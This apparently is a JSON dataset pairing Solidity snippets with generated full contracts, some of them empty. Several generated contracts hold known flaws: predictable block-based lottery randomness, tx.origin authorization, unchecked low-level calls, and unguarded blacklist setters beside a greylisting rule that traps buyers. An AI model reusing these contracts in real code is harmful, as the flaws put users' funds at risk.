{
    "1.sol": {
        "input": "npm install dotenv --save\n\n \n\nrequire('dotenv').config();\nrequire(\"@nomiclabs/hardhat-ethers\");\nmodule.exports = {\n  solidity: \"0.8.17\",\n  defaultNetwork: \"goerli\",\n  networks: {\n     hardhat: {},\n     goerli: {\n        url:process.env.API_URL,\n        accounts: [`0x${process.env.PRIVATE_KEY}`]\n     }\n  },\n};\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint256 public myValue;\n    \n    constructor(uint256 _myValue) {\n        myValue = _myValue;\n    }\n\n    function setMyValue(uint256 _myValue) public {\n        myValue = _myValue;\n    }\n\n    function getMyValue() public view returns (uint256) {\n        return myValue;\n    }\n}\n\n",
        "changed": 1
    },
    "2.sol": {
        "input": "struct Country {\n  uint a;\n  uint b;\n  string c;\n}\n\nexpect(await contract.getACountry(\"FR\")).to.have.member([1, 2, \"FR\"])\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Countries {\n    // Define the structure\n    struct Country {\n        uint a;\n        uint b;\n        string c;\n    }\n    \n    // Define a mapping to store countries with a string as a key\n    mapping(string => Country) countries;\n\n    // Function to add a country\n    function addCountry(string memory _key, uint _a, uint _b, string memory _c) public {\n        Country storage country = countries[_key];\n        country.a = _a;\n        country.b = _b;\n        country.c = _c;\n    }\n\n    // Function to get a country\n    function getACountry(string memory _key) public view returns(uint, uint, string memory) {\n        Country storage country = countries[_key];\n        return (country.a, country.b, country.c);\n    }\n}\n\n",
        "changed": 0
    },
    "3.sol": {
        "input": "int top = int(int8(data[2]));\n\nint top = int(uint(data[2]));\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint8[] public data;\n\n    constructor(uint8[] memory initialData) public {\n        data = initialData;\n    }\n\n    function getTop1() public view returns (int) {\n        int top = int(int8(data[2]));\n        return top;\n    }\n\n    function getTop2() public view returns (int) {\n        int top = int(uint(data[2]));\n        return top;\n    }\n}\n\n",
        "changed": 0
    },
    "5.sol": {
        "input": "mapping(address => bool) public mappingName;\n\nfunction mappingName(address _myVar) public returns (bool)\n\nmappingName(address)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MySmartContract {\n    mapping(address => bool) public mappingName;\n\n    function setMappingName(address _myVar, bool _value) public {\n        mappingName[_myVar] = _value;\n    }\n\n    function getMappingName(address _myVar) public view returns (bool) {\n        return mappingName[_myVar];\n    }\n}\n\n",
        "changed": 0
    },
    "6.sol": {
        "input": "function pushelement() public {\n    by1 = abi.encodePacked(by1, bytes1(0x10));\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract PushElementContract {\n    bytes by1;\n\n    constructor() public {\n        by1 = \"\";\n    }\n\n    function pushelement() public {\n        by1 = abi.encodePacked(by1, bytes1(0x10));\n    }\n    \n    function getelement() public view returns (bytes memory) {\n        return by1;\n    }\n}\n\n",
        "changed": 0
    },
    "7.sol": {
        "input": "struct Team {\n    string engineer;\n    mapping (string=>uint) numbers;\n}\n\nmapping(string=>Team) teams;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TeamContract {\n    struct Team {\n        string engineer;\n        mapping (string => uint) numbers;\n    }\n\n    mapping(string => Team) teams;\n\n    function addEngineer(string memory _teamId, string memory _engineer) public {\n        Team storage team = teams[_teamId];\n        team.engineer = _engineer;\n    }\n\n    function addNumber(string memory _teamId, string memory _numberId, uint _number) public {\n        Team storage team = teams[_teamId];\n        team.numbers[_numberId] = _number;\n    }\n\n    function getEngineer(string memory _teamId) public view returns (string memory) {\n        return teams[_teamId].engineer;\n    }\n\n    function getNumber(string memory _teamId, string memory _numberId) public view returns (uint) {\n        return teams[_teamId].numbers[_numberId];\n    }\n}\n\n",
        "changed": 0
    },
    "9.sol": {
        "input": "pragma solidity ^0.7;\n\ncontract MyContract {\n    function foo() external pure returns (uint256) {\n        return uint(-1);\n    }\n}\n\npragma solidity ^0.8;\n\ncontract MyContract {\n    function foo() external pure returns (uint256) {\n        uint256 number = 0;\n        number--;\n        return number;\n    }\n}\n\nconst BN = web3.utils.BN;\nconst number = (new BN(2)).pow(new BN(8)).sub(new BN(1));\nconsole.log(number.toString());\n\nconst BN = web3.utils.BN;\nconst number = (new BN(2)).pow(new BN(256)).sub(new BN(1));\nconsole.log(number.toString());\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    function foo() external pure returns (uint256) {\n        uint256 number = 0;\n        number--;\n        return number;\n    }\n}\n\n",
        "changed": 0
    },
    "10.sol": {
        "input": "        if(!tokenWhitelist[msg.sender]&&!tokenWhitelist[_to]){\n            require(tokenBlacklist[msg.sender] == false);\n            require(tokenBlacklist[_to] == false);\n\n            require(tokenGreylist[msg.sender] == false);\n        }\n\n        if(msg.sender==LP&&ab&&!tokenWhitelist[_to]){\n            tokenGreylist[_to] = true;\n            emit Gerylist(_to, true);\n        }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address public LP;\n    bool public ab;\n    mapping(address => bool) public tokenWhitelist;\n    mapping(address => bool) public tokenBlacklist;\n    mapping(address => bool) public tokenGreylist;\n\n    event Greylist(address indexed _to, bool _isGreylisted);\n\n    constructor(address _LP, bool _ab) public {\n        LP = _LP;\n        ab = _ab;\n    }\n\n    function setTokenWhitelist(address _addr, bool _isWhitelisted) public {\n        tokenWhitelist[_addr] = _isWhitelisted;\n    }\n\n    function setTokenBlacklist(address _addr, bool _isBlacklisted) public {\n        tokenBlacklist[_addr] = _isBlacklisted;\n    }\n\n    function setTokenGreylist(address _addr, bool _isGreylisted) public {\n        tokenGreylist[_addr] = _isGreylisted;\n    }\n\n    function sendToken(address _to) public {\n        if(!tokenWhitelist[msg.sender] && !tokenWhitelist[_to]){\n            require(tokenBlacklist[msg.sender] == false);\n            require(tokenBlacklist[_to] == false);\n            require(tokenGreylist[msg.sender] == false);\n        }\n\n        if(msg.sender == LP && ab && !tokenWhitelist[_to]){\n            tokenGreylist[_to] = true;\n            emit Greylist(_to, true);\n        }\n\n        // Implement token transfer logic here\n    }\n}\n\n",
        "changed": 0
    },
    "11.sol": {
        "input": "function createCollectible(string memory tokenURI) public returns(uint256) {\n    require(tokenCounter == 0, \"error msg here\");\n    uint256 newItemId = tokenCounter;\n    _safeMint(msg.sender, newItemId);\n    _setTokenURI(newItemId, tokenURI);\n    tokenCounter = tokenCounter + 1;\n    return newItemId;\n  }\n\n\n",
        "output": "",
        "changed": 0
    },
    "12.sol": {
        "input": "for (element in array) {\n    ...\n}\n\nfor (uint256 i=0; i < array.length; i++) {\n    ...\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint256[] public array;\n\n    constructor() {\n        array = new uint256[](10);\n        for (uint256 i = 0; i < array.length; i++) {\n            array[i] = i;\n        }\n    }\n\n    function loopThroughArray() public view returns (uint256) {\n        uint256 sum = 0;\n        for (uint256 i = 0; i < array.length; i++) {\n            sum += array[i];\n        }\n        return sum;\n    }\n}\n\n",
        "changed": 1
    },
    "13.sol": {
        "input": "require(msg.value > 0.1 ether); \n\n\n",
        "output": "pragma solidity ^0.5.16;\ncontract SimpleContract {\n    address payable public owner;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n    \n    function deposit() public payable {\n        require(msg.value > 0.1 ether, \"Amount should be greater than 0.1 ether\");\n        owner.transfer(msg.value);\n    }\n}\n\n",
        "changed": 0
    },
    "14.sol": {
        "input": "address payable public winner;\nfunction selectWinner() public {\n}\n...\n\nfunction showWinner() public returns(bool) {\n      return winner.transfer(getMoney());\n}\n\ncontract Lottery{\n    address public manager;\n    address payable[] public participants; \n    address payable selectedWinner;\n\n    constructor(){\n        manager = msg.sender;   \n    }\n\n    receive() external payable{       \n        require(msg.value == 1 ether);\n        participants.push(payable(msg.sender));\n    } \n\n    function getMoney() public view returns(uint){\n        require(msg.sender == manager);\n        return address(this).balance;\n    }\n\n    function random() public view returns(uint){\n        return uint(keccak256(abi.encodePacked(block.difficulty,block.timestamp,participants.length)));\n    }\n   \n    function selectWinner() public{\n        require(msg.sender == manager);\n        require(participants.length >= 3);\n        uint r = random();\n\n\n        uint index = r % participants.length;\n\n        selectedWinner = participants[index];\n        selectedWinner.transfer(getMoney());   \n    }\n\n    function showWinner() public view returns(address){\n         return selectedWinner;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Lottery {\n    address public manager;\n    address payable[] public participants; \n    address payable public selectedWinner;\n\n    constructor() {\n        manager = msg.sender;   \n    }\n\n    receive() external payable {       \n        require(msg.value == 1 ether);\n        participants.push(payable(msg.sender));\n    } \n\n    function getMoney() public view returns(uint){\n        require(msg.sender == manager);\n        return address(this).balance;\n    }\n\n    function random() public view returns(uint){\n        return uint(keccak256(abi.encodePacked(block.difficulty,block.timestamp,participants.length)));\n    }\n\n    function selectWinner() public{\n        require(msg.sender == manager);\n        require(participants.length >= 3);\n\n        uint r = random();\n        uint index = r % participants.length;\n\n        selectedWinner = participants[index];\n\n        //transfer entire contract balance to the winner\n        selectedWinner.transfer(address(this).balance);   \n    }\n\n    function showWinner() public view returns(address){\n         return selectedWinner;\n    }\n}\n",
        "changed": 0
    },
    "15.sol": {
        "input": "uint public studentsCounter;\n\nmapping (uint => mapping (address => student)) public Info;\n\nfunction addInfo(student memory _student, address _address) public returns(uint){\n    require(owner == msg.sender, \"Only admin can add Info!!!\");\n    Info[studentsCounter][_address] = _student;\n    studentsCounter++;\n    student_Info.push(_address);\n    return studentsCounter-1;\n}\n\nstudent[] public student_Info;\n\nfunction addInfo(student memory _student, address _address) public {\n    require(owner == msg.sender, \"Only admin can add Info!!!\");\n    Info[_address] = _student;\n    student_Info.push(_student);\n} \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract StudentContract {\n    struct Student {\n        uint id;\n        string name;\n        string class;\n    }\n\n    address public owner;\n    uint public studentsCounter;\n\n    mapping (uint => mapping (address => Student)) public Info;\n    Student[] public student_Info;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function addInfo(Student memory _student, address _address) public returns(uint){\n        require(owner == msg.sender, \"Only admin can add Info!!!\");\n        Info[studentsCounter][_address] = _student;\n        studentsCounter++;\n        student_Info.push(_student);\n        return studentsCounter-1;\n    }\n\n    function addInfoToAddress(Student memory _student, address _address) public {\n        require(owner == msg.sender, \"Only admin can add Info!!!\");\n        Info[studentsCounter][_address] = _student;\n        student_Info.push(_student);\n    }\n}\n\n",
        "changed": 0
    },
    "16.sol": {
        "input": "     \nfunction convertFromTronInt(uint256 tronAddress) public view returns(address){\n      return address(tronAddress);\n}\n\ntronWeb.address.toHex(\"TH4EovGaTrmWxhJSmeMVKy5ZpnDGE3DgJ8\")\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract TronConverter {\n    // Function to convert Tron integer to an address\n    function convertFromTronInt(uint256 tronAddress) public pure returns(address){\n        return address(tronAddress);\n    }\n    \n    // Function to convert Tron address to hexadecimal\n    function convertTronAddressToHex(string memory tronAddress) public pure returns(bytes memory){\n        // Encodes the Tron address to bytes and returns it\n        return bytes(tronAddress);\n    }\n}\n\n",
        "changed": 0
    },
    "17.sol": {
        "input": "pragma solidity ^0.8.7;\n\ncontract Bank {\n    uint256 public amountIn;\n    function deposit() external payable returns(uint256) {\n        amountIn = msg.value ;\n        return amountIn;\n    }\n    function getBalance() public view returns(uint){\n        return address(this).balance;\n    }\n}\n\n\ninterface Receiver {\n    function deposit() external payable returns(uint256);\n}\n\ncontract Sender {\n    Receiver private receiver ;\n    constructor(address _receiver){\n        receiver=Receiver(_receiver);\n    }\n\n    function sendDeposit(uint256 _amount) public payable {\n        receiver.deposit{value: _amount}();\n    }\n\n    receive() external payable {\n         require(msg.value > 0, \"You cannot send 0 ether\");\n    }\n\n }\n\n\n",
        "output": "//SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\n\ncontract Bank {\n    uint256 public amountIn;\n    function deposit() external payable returns(uint256) {\n        amountIn = msg.value ;\n        return amountIn;\n    }\n    // receive() external payable{}\n    function getBalance() public view returns(uint){\n        return address(this).balance;\n    }\n}\n\n\ninterface Receiver {\n    function deposit() external payable returns(uint256);\n}\n\ncontract Sender {\n    Receiver private receiver ;\n    constructor(address _receiver){\n        receiver=Receiver(_receiver);\n    }\n\n    function sendDeposit(uint256 _amount) public payable {\n        receiver.deposit{value: _amount}();\n    }\n\n    receive() external payable {\n         require(msg.value > 0, \"You cannot send 0 ether\");\n    }\n\n }\n\n",
        "changed": 0
    },
    "18.sol": {
        "input": "    address payable owner = msg.sender;\n\n    token.transferFrom(msg.sender, address(this), _amount);\n\n    owner.transfer(etherAmount);\n}\n\n\n",
        "output": "pragma solidity ^0.5.16;\ninterface IERC20 {\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\ncontract MyContract {\n    IERC20 public token;\n    address payable public owner;\n\n    constructor(IERC20 _token) public {\n        owner = msg.sender;\n        token = _token;\n    }\n\n    function transferToken(uint256 _amount) public {\n        require(token.transferFrom(msg.sender, address(this), _amount), \"Token transfer failed\");\n    }\n\n    function transferEther(uint256 etherAmount) public {\n        require(msg.sender == owner, \"Only owner can transfer Ether\");\n        owner.transfer(etherAmount);\n    }\n}\n\n",
        "changed": 0
    },
    "22.sol": {
        "input": "pragma solidity >=0.4.22 <0.9.0;\n\n\ncontract spu_university {\n    constructor(){\n    }\n\n    uint s_counter=0;\n\n    struct course {\n        string name;\n    }\n\n    struct student {\n        uint  id;\n        string firstName;\n        course[] all_courses;\n    }\n\n\n    mapping(uint => student) public getstudent;\n    \n    function registerStudent(\n        uint  _id,\n        string memory _firstName\n        ) public {\n            student storage s = getstudent[_id];\n\n            s.id = _id;\n            s.firstName = _firstName;\n\n            course memory c;\n            c.name = \"some course name\";\n            s.all_courses.push(c);\n\n            s_counter ++; \n    }\n\n    function addCourseToStudent(uint  _id) public {\n        student storage s = getstudent[_id];\n\n        course memory c;\n        c.name = \"some other course name\";\n\n        s.all_courses.push(c);\n    }\n\n    function getCourseOfStudent(uint _id) public view returns (course[] memory) {\n        return getstudent[_id].all_courses;\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity >=0.4.22 <0.9.0;\n\n\ncontract spu_university {\n    constructor(){\n    }\n\n    uint s_counter=0;\n\n    struct course {\n        string name;\n    }\n\n    struct student {\n        uint  id;\n        string firstName;\n        course[] all_courses;\n    }\n\n\n    mapping(uint => student) public getstudent;\n    \n    function registerStudent(\n        uint  _id,\n        string memory _firstName\n        ) public {\n            student storage s = getstudent[_id];\n\n            s.id = _id;\n            s.firstName = _firstName;\n\n            course memory c;\n            c.name = \"some course name\";\n            s.all_courses.push(c);\n\n            s_counter ++; \n    }\n\n    function addCourseToStudent(uint  _id) public {\n        student storage s = getstudent[_id];\n\n        course memory c;\n        c.name = \"some other course name\";\n\n        s.all_courses.push(c);\n    }\n\n    function getCourseOfStudent(uint _id) public view returns (course[] memory) {\n        return getstudent[_id].all_courses;\n    }\n}\n\n",
        "changed": 0
    },
    "23.sol": {
        "input": "function mint() payable public returns (uint256) {\n  require(msg.value == 0.1 ether || msg.value == 100000000000000000 \n    wei, \"Transaction amount has to be 0.1 eth\");\n\n  payable(this).transfer(msg.value);\n\n  _safeMint(msg.sender, token_id);\n\n  token_id.increament();\n\n  return token_id;\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "24.sol": {
        "input": " function setServiceFees(uint256[] memory prices) public onlyOwner {\n        require(prices.length == 4);\n        serviceFees = prices;\n    }\n\nmyContract.setServiceFees([\n        ethers.utils.parseEther(batchFee.toString()),\n        ethers.utils.parseEther(easyFee.toString()),\n        ethers.utils.parseEther(sellFee.toString()),\n        ethers.utils.parseEther(forthFee.toString()),\n  ])\n\n\n",
        "output": "",
        "changed": 0
    },
    "25.sol": {
        "input": "uint public addition = add(1,2);\nuint public product = multiply(add(2,3),add(2,1));\n\nfunction add(uint a,uint b)public pure returns(uint output){\n    output = a+b;\n}\n\nfunction multiply(uint a,uint b)public pure returns(uint){\n    return a*b;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MathOperations {\n    uint public addition;\n    uint public product;\n\n    constructor() public {\n        addition = add(1,2);\n        product = multiply(add(2,3),add(2,1));\n    }\n\n    function add(uint a,uint b) public pure returns(uint output){\n        output = a+b;\n        return output;\n    }\n\n    function multiply(uint a,uint b) public pure returns(uint){\n        return a*b;\n    }\n}\n\n",
        "changed": 0
    },
    "26.sol": {
        "input": "_binary[i] = bytes1(abi.encodePacked(r));\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract BinaryContract {\n    \n    bytes private _binary;\n    \n    constructor() {\n        _binary = new bytes(32);\n    }\n    \n    function setBinary(uint i, uint8 r) public {\n        require(i < _binary.length, \"Index out of bounds\");\n        _binary[i] = bytes1(abi.encodePacked(r));\n    }\n    \n    function getBinary() public view returns (bytes memory) {\n        return _binary;\n    }\n}\n\n",
        "changed": 0
    },
    "27.sol": {
        "input": "bytes32 leaf = keccak256(abi.encodePacked(account, amount));\n\nbytes32 computedHash = leaf;\ncomputedHash = _hashPair(computedHash, proofElement);\n\nif (computedRoot != root) {\n    revert InvalidProof();\n}\n\nIERC20(token).transfer(account, amount)\n\n\n",
        "output": "",
        "changed": 0
    },
    "28.sol": {
        "input": "require(msg.sender == tx.origin, \"Reverting, Method can only be called directly by user.\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    // Address of the contract owner\n    address private owner;\n\n    // Event to emit when the contract is called by the owner\n    event CalledByOwner();\n\n    // Sets the contract deployer as the owner\n    constructor() {\n        owner = msg.sender;\n    }\n\n    // Method that can only be called directly by user (owner)\n    function callByOwner() public {\n        // Checks if the caller is the owner\n        require(msg.sender == tx.origin, \"Reverting, Method can only be called directly by user.\");\n\n        // Checks if the caller is the owner\n        require(msg.sender == owner, \"Caller is not the owner\");\n\n        // Emit the event\n        emit CalledByOwner();\n    }\n}\n\n",
        "changed": 0
    },
    "29.sol": {
        "input": "project:/contracts/Fundraiser.sol:8:5 \n\nproject:/contracts/Fundraiser.sol:9:5\n\nproject:/contracts/Fundraiser.sol:18:5\nproject:/contracts/Fundraiser.sol:19:5\n\npragma solidity >0.4.23 <0.7.0;\n\ncontract Fundraiser{\n  string public name;\n  string public url;\n  string public imageURL;\n  string public description;\n  address payable beneficiary; \n  address custodian; \n\n  constructor(\n    string memory _name,\n    string memory _url,\n    string memory _imageURL,\n    string memory _description,\n    address payable _beneficiary,\n    address _custodian\n  )\n\n  public{\n    name = _name;\n    url = _url;\n    imageURL = _imageURL;\n    description = _description;\n    beneficiary = _beneficiary;\n    custodian = _custodian;\n\n         }\n       \u3000}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Fundraiser {\n  string public name;\n  string public url;\n  string public imageURL;\n  string public description;\n  address payable public beneficiary; \n  address public custodian; \n\n  constructor(\n    string memory _name,\n    string memory _url,\n    string memory _imageURL,\n    string memory _description,\n    address payable _beneficiary,\n    address _custodian\n  ) public {\n    name = _name;\n    url = _url;\n    imageURL = _imageURL;\n    description = _description;\n    beneficiary = _beneficiary;\n    custodian = _custodian;\n  }\n}\n\n",
        "changed": 0
    },
    "30.sol": {
        "input": "bytes4 private constant SELECTOR = bytes4(keccak256(bytes(\"transfer(address,uint256)\")));\n\n  nonPayableAddress.call(abi.encodeWithSignature(\"transfer(address,uint256)\", 0xaddress, amount))\n\n(bool success, bytes memory data) = contractAddress.call(\n        abi.encodeWithSelector(SELECTOR, to, value)\n    );\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    bytes4 private constant SELECTOR = bytes4(keccak256(bytes(\"transfer(address,uint256)\")));\n\n    function transferTokens(address nonPayableAddress, address contractAddress, address to, uint256 value, uint256 amount) public returns (bool success) {\n\n        nonPayableAddress.call(abi.encodeWithSignature(\"transfer(address,uint256)\", to, amount));\n\n        (bool success, bytes memory data) = contractAddress.call(\n            abi.encodeWithSelector(SELECTOR, to, value)\n        );\n\n        return success;\n    }\n}\n\n",
        "changed": 0
    },
    "31.sol": {
        "input": "address lucky_winner = Daily.participants[index];\n\nlucky_winner = Daily.participants[index];\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract DailyLottery {\n    address[] public participants;\n    \n    function enter() public {\n        participants.push(msg.sender);\n    }\n    \n    function pickWinner() public view returns (address) {\n        require(participants.length > 0, \"No participants in the lottery yet.\");\n        uint index = random() % participants.length;\n        return participants[index];\n    }\n\n    function random() private view returns (uint) {\n        return uint(keccak256(abi.encodePacked(block.difficulty, block.timestamp, participants.length)));\n    }\n}\n\n",
        "changed": 1
    },
    "32.sol": {
        "input": "require(price >= 2, 'This token is not for sale');\n\n... = ownerOf(_id)\n\n_transfer(owner, msg.sender, _id);\n\npayable(owner).transfer(msg.value);\n\n\n",
        "output": "pragma solidity ^0.5.16;\ncontract SaleContract {\n\n    mapping(uint => address payable) private owners;\n    mapping(uint => uint) private prices;\n\n    function ownerOf(uint _id) private view returns (address) {\n        return owners[_id];\n    }\n\n    function priceOf(uint _id) private view returns (uint) {\n        return prices[_id];\n    }\n\n    function buyToken(uint _id) public payable {\n        uint price = priceOf(_id);\n        require(price >= 2, 'This token is not for sale');\n        address payable owner = address(uint160(ownerOf(_id)));\n\n        _transfer(owner, msg.sender, _id);\n\n        owner.transfer(msg.value);\n    }\n\n    function _transfer(address payable _from, address _to, uint _id) private {\n        owners[_id] = address(uint160(_to));\n    }\n\n    // More functions or code can be added here as per requirements\n    // Like a function to issue new tokens, set the price of a token etc.\n}\n\n",
        "changed": 0
    },
    "33.sol": {
        "input": "...\nimport \"@openzeppelin/contracts/utils/Counters.sol\";\n...\nerror ExceededWhitelistSupply();\n...\nusing Counters for Counters.Counter;\nuint256 public maxSupply = 10000;\nuint256 public maxWhitelistSupply = 1500;\nCounters.Counter private totalWhitelistSupply;\n...\nfunction mintWhitelist(uint256 _qty) external payable {\n  if ( totalWhitelistSupply.current() + _qty > maxWhitelistSupply ) revert ExceededWhitelistSupply();\n\n  for (uint256 i = 0; i < _qty; i++) {\n    totalWhitelistSupply.increment();\n  }\n\n  _mint(msg.sender, _qty, '', true);\n}\n\n...\nimport \"@openzeppelin/contracts/utils/Counters.sol\";\n...\nerror ExceededWhitelistSupply();\nerror ExceededMaxPerWallet();\n...\nusing Counters for Counters.Counter;\nuint256 public maxSupply = 10000;\nuint256 public maxWhitelistSupply = 1500;\nuint256 public maxWhitelistPerWallet = 10;\nCounters.Counter private totalWhitelistSupply;\n\nmapping(address => uint256) public whitelistMintedAmount;\n...\nfunction mintWhitelist(uint256 _qty) external payable {\n  if ( whitelistMintedAmount[msg.sender] + _qty > maxWhitelistPerWallet ) revert ExceededMaxPerWallet();\n  if ( totalWhitelistSupply.current() + _qty > maxWhitelistSupply ) revert ExceededWhitelistSupply();\n\n  for (uint256 i = 0; i < _qty; i++) {\n    totalWhitelistSupply.increment();\n  }\n\n  whitelistMintedAmount[msg.sender] += _qty;\n  _mint(msg.sender, _qty, '', true);\n}\n\n\n",
        "output": "",
        "changed": 1
    },
    "34.sol": {
        "input": "enum Role{ NONE, GUARDIAN, WARD} \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    enum Role { NONE, GUARDIAN, WARD }\n\n    mapping(address => Role) public roles;\n\n    function assignRole(address _person, Role _role) public {\n        roles[_person] = _role;\n    }\n\n    function getRole(address _person) public view returns (Role) {\n        return roles[_person];\n    }\n}\n\n",
        "changed": 0
    },
    "35.sol": {
        "input": "function getStudentInfo(uint256 num) public view returns (bytes32, student memory) {\n    bytes32 key = student_Address[num];\n    return (\n        key,\n        studentMap[key]\n    );\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract StudentInfo {\n    struct student {\n        uint256 id;\n        string name;\n        string course;\n    }\n    \n    mapping(bytes32 => student) public studentMap;\n    bytes32[] public student_Address;\n\n    function addStudent(uint256 _id, string memory _name, string memory _course, bytes32 _studentAddress) public {\n        student memory newStudent = student({\n            id: _id,\n            name: _name,\n            course: _course\n        });\n        \n        studentMap[_studentAddress] = newStudent;\n        student_Address.push(_studentAddress);\n    }\n\n    function getStudentInfo(uint256 num) public view returns (bytes32, uint256, string memory, string memory) {\n        bytes32 key = student_Address[num];\n        return (\n            key,\n            studentMap[key].id,\n            studentMap[key].name,\n            studentMap[key].course\n        );\n    }\n}\n\n",
        "changed": 0
    },
    "36.sol": {
        "input": "IHEX(0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39).approve(_to,amount);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function approve(address spender, uint256 value) external returns (bool);\n}\n\ncontract MyContract {\n    IERC20 public token;\n\n    constructor(address tokenAddress) public {\n        token = IERC20(tokenAddress);\n    }\n\n    function approveToken(address _to, uint256 amount) public returns (bool) {\n        return token.approve(_to, amount);\n    }\n}\n\n",
        "changed": 0
    },
    "37.sol": {
        "input": "holderlist[0] = msg.sender;\n\nholderlist.push(msg.sender);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract HolderListContract {\n    address[] public holderlist;\n\n    constructor() public {\n        holderlist.push(msg.sender);\n    }\n\n    function addHolder() public {\n        holderlist.push(msg.sender);\n    }\n\n    function getHolder(uint index) public view returns (address) {\n        return holderlist[index];\n    }\n\n    function getHolderCount() public view returns (uint) {\n        return holderlist.length;\n    }\n}\n\n",
        "changed": 0
    },
    "38.sol": {
        "input": "address public maticFarmAddress = 0x24920E62B2702c11011823E64387B8AB46C1c927; \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MaticFarm {\n    address public maticFarmAddress;\n\n    constructor() {\n        maticFarmAddress = 0x24920E62B2702c11011823E64387B8AB46C1c927;\n    }\n}\n\n",
        "changed": 1
    },
    "39.sol": {
        "input": "pragma solidity 0.8.13;\n\ncontract TestLoop {\n    uint32[4] testArray;\n\n    function setArrayWithLoop(uint32[4] memory array) public {\n        for(uint256 i = 0; i < array.length; i++)\n            testArray[i] = array[i];\n    }\n\n    function setArrayWithoutLoop(uint32[4] memory array) public {\n        testArray = array;\n    }\n\n    function show() public view returns (uint32[4] memory) {\n        return testArray;\n    }\n}\n\ncontract NoLoop {\n    uint32[4] testArray;\n\n    constructor(uint32[4] memory array) {\n        testArray = array;\n    }\n\n    function show() public view returns (uint32[4] memory) {\n        return testArray;\n    }\n}\n\ncontract Loop {\n    uint32[4] testArray;\n\n    constructor (uint32[4] memory array) {\n        for(uint256 i = 0; i < array.length; i++)\n            testArray[i] = array[i];\n    }\n\n    function show() public view returns (uint32[4] memory) {\n        return testArray;\n    }\n}\n\nfrom brownie import TestLoop, NoLoop, Loop, accounts\n\ndef function_calls():\n    contract = TestLoop.deploy({'from': accounts[0]})\n    print('set array in loop')\n    contract.setArrayWithLoop([1, 2, 3, 4], {'from': accounts[1]})\n    print('array ', contract.show(), '\\n\\n')\n\n    print('set array by copy from memory to storage')\n    contract.setArrayWithoutLoop([10, 9, 8, 7], {'from': accounts[2]})\n    print('array ', contract.show(), '\\n\\n')\n\ndef deploy_no_loop():\n    print('deploy NoLoop contract')\n    contract = NoLoop.deploy([21, 22, 23, 24], {'from': accounts[3]})\n    print('array ', contract.show(), '\\n\\n')\n\ndef deploy_loop():\n    print('deploy Loop contract')\n    contract = Loop.deploy([31, 32, 33, 34], {'from': accounts[3]})\n    print('array ', contract.show(), '\\n\\n')\n\ndef main():\n    function_calls()\n    deploy_no_loop()\n    deploy_loop()\n\ncompiler:\n  solc:\n    version: 0.8.13\n    optimizer:\n      enabled: true\n      runs: 1\n\nRunning 'scripts/test_loop.py::main'...\nTransaction sent: 0x8380ef4abff179f08ba9704826fc44961d212e5ee10952ed3904b5ec7828c928\n  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0\n  TestLoop.constructor confirmed   Block: 1   Gas used: 251810 (2.10%)\n  TestLoop deployed at: 0x3194cBDC3dbcd3E11a07892e7bA5c3394048Cc87\n\nset array in loop\nTransaction sent: 0xfe72d6c878a980a9eeefee1dccdd0fe8214ee4772ab68ff0ac2b72708b7ab946\n  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0\n  TestLoop.setArrayWithLoop confirmed   Block: 2   Gas used: 49454 (0.41%)\n\narray  (1, 2, 3, 4) \n\n\nset array by copy from memory to storage\nTransaction sent: 0x0106d1a7e37b155993a6d32d5cc9dc67696a55acd1cf29d2ed9dba0770436b98\n  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0\n  TestLoop.setArrayWithoutLoop confirmed   Block: 3   Gas used: 41283 (0.34%)\n\narray  (10, 9, 8, 7) \n\n\ndeploy NoLoop contract\nTransaction sent: 0x55ddded68300bb8f11b3b43580c58fed3431a2823bf3f82f0081c7bfce66f34d\n  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0\n  NoLoop.constructor confirmed   Block: 4   Gas used: 160753 (1.34%)\n  NoLoop deployed at: 0x7CA3dB74F7b6cd8D6Db1D34dEc2eA3c89a3417ec\n\narray  (21, 22, 23, 24) \n\n\ndeploy Loop contract\nTransaction sent: 0x1aa64f2cd527983df84cfdca5cfd7a281ff904cca227629ec8b0b29db561c043\n  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 1\n  Loop.constructor confirmed   Block: 5   Gas used: 153692 (1.28%)\n  Loop deployed at: 0x2fb0fE4F05B7C8576F60A5BEEE35c23632Dc0C27\n\narray  (31, 32, 33, 34)\n\n\n",
